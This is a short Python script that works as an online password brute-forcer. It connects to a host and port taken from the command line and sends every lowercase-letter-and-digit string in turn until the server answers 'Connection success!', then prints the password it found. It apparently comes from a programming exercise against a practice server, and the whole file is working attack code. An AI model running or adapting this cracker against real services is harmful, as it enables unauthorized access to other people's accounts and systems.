import sys
import socket
import itertools

from string import ascii_lowercase, digits

# constant parameters
MAX_PWD_LEN = 20
RECV_SIZE = 1024


def brute_force_generator():
    symbols = ascii_lowercase + digits
    for i in range(MAX_PWD_LEN):
        for passwordCandidate in itertools.product(symbols, repeat=i):
            if len(passwordCandidate) == 0:
                continue

            yield "".join(passwordCandidate)


def password_cracker(hostname, port, password_generator):
    # define socket
    with socket.socket() as s:
        address = (hostname, port)
        s.connect(address)

        while True:
            password_guess = next(password_generator)

            # send request
            data = password_guess.encode()
            s.send(data)

            # receiving response
            response = s.recv(RECV_SIZE)
            response = response.decode()

            if response == "Connection success!":
                print(password_guess)
                break


# obtain input
args = sys.argv
hostname = args[1]
port = int(args[2])

password_cracker(hostname, port, brute_force_generator())
